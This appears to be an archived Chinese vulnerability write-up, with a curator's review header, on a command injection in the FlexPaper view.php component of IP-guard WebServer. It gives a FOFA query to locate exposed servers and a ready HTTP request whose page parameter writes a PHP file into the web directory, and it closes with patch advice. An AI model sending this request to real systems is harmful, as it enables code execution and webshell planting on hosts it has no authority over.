---
source: "MrWQ/vulnerability-paper"
id: "vw-11719bcca7a197ea4693b14d"
entity_id: "ve-11719bcca7a197ea4693b14d"
schema_version: "1"
fofa_unverified: "查询语句"
title: "IP-guard WebServer 存在远程命令执行漏洞 附 POC"
product: "IP-guard WebServer内置FlexPaper PHP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "<4.81.0307.0，Windows shell语法、脚本目录可写及PHP解析"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/IP-guard/IP-guard%20WebServer%20%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://mp.weixin.qq.com/s/a_M7HxWqW97pYy_UEMBVaA"
source_status: "recorded"
---

# IP-guard WebServer 存在远程命令执行漏洞 附 POC

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：IP-guard WebServer内置FlexPaper PHP
- 本文讨论：view.php page命令注入
- 版本、权限与配置前提：&lt;4.81.0307.0，Windows shell语法、脚本目录可写及PHP解析
- 资料类型：FlexPaper命令注入复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 漏洞描述只有产品介绍，编号空字段；独立工具需公众号付费渠道不应称随文附完整POC
- 响应证据仅图片，缺服务权限和鉴权说明；FOFA字段为查询语句占位
- 存在大量推广内容
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 修复版本、匿名访问及实际Windows配置待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/a_M7HxWqW97pYy_UEMBVaA)

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. IP-guard WebServer 简介
------------------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

IP-guard 是由溢信科技股份有限公司开发的一款终端安全管理软件。

2. 漏洞描述
-------

IP-guard 是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化 IT 系统管理。

CVE 编号:

CNNVD 编号:

CNVD 编号:

3. 影响版本
-------

IP-guard < 4.81.0307.0

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YIw2kZXJoew7Vhr5jGicibWDETUrKbgSRRibJhrYBEAkMrgfIUiaCTop4K0WnVgSmkDbYFLKnRuKP9eA/640?wx_fmt=jpeg&from=appmsg)IP-guard WebServer 存在远程命令执行漏洞

4.fofa 查询语句
-----------

app="IP-guard"

5. 漏洞复现
-------

漏洞链接：http://127.0.0.1/ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=%7C%7Cecho+^%3C?php+phpinfo();+?^%3E+%3Esanyt.php

漏洞数据包：

```http
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=%7C%7Cecho+^%3C?php+phpinfo();+?^%3E+%3Esanyt.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YIw2kZXJoew7Vhr5jGicibWD65DawTmvBfn4dRf9MMIicLicVjlcgTLmicc3geyr1H0Ql0WRwnSiazVubg/640?wx_fmt=jpeg&from=appmsg)

拼接上传的地址：http://127.0.0.1/ipg/static/appr/lib/flexpaper/php/sanyt.php

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YIw2kZXJoew7Vhr5jGicibWDicI2ib8cdJDruIhqFdD7gRUtEpqTdPuicriaZuCtB1mx1R4cvnGbCCiarHA/640?wx_fmt=jpeg&from=appmsg)

6.POC&EXP
---------

关注公众号 南风漏洞复现文库 并回复 漏洞复现 73 即可获得该 POC 工具下载地址：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YIw2kZXJoew7Vhr5jGicibWDLPdRMMIlndeJT9B3pMhGIASibUXPzDrJyAeNx8ibBqtiaCkN3DTeUn28w/640?wx_fmt=jpeg&from=appmsg)

**本期漏洞及往期漏洞的批量扫描 POC 及 POC 工具箱已经上传知识星球：南风网络安全**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YIw2kZXJoew7Vhr5jGicibWDN9Fk2dWJFqxwmIxCeMLiaQicOr3cGPtx5Y4HEngejMRRnTbAic36D0eCg/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YIw2kZXJoew7Vhr5jGicibWD9Ny9YUmXTiaaiaicqJcia7f3AgFtwWp1dzkI9pAyUwkMZDWm54vzBicJ0Lw/640?wx_fmt=jpeg&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YIw2kZXJoew7Vhr5jGicibWDaeELQnDVmGODcPoiacmGnCaTV5VXTGw7FjJun7Y1ibuOXVzk70MgvLRQ/640?wx_fmt=jpeg&from=appmsg)

7. 整改意见
-------

官方已发布新版本修复漏洞，建议尽快访问官网（https://www.ip-guard.net/）或联系官方售后支持获取版本升级安装包或补丁，升级至 4.81.0307.0 版本及以上

8. 往期回顾
-------

[用友 NC Cloud accept.jsp 接口存在任意文件上传漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484501&idx=1&sn=ef39e1cb9a924896718fa1ad52ebf6c8&chksm=974b8952a03c004408c6eebab74397067875d6e5b0b2fbe13415ef6032937f78951f62600b61&scene=21#wechat_redirect)  

[易思智能物流无人值守系统 5.0 存在任意文件上传漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484489&idx=1&sn=e38ea99ed0af5d68fff02fe16f0a2907&chksm=974b894ea03c0058b44a9ef289d9d3ef3f6f4003c58b3aedea14541238c2bddb8865e9a58279&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
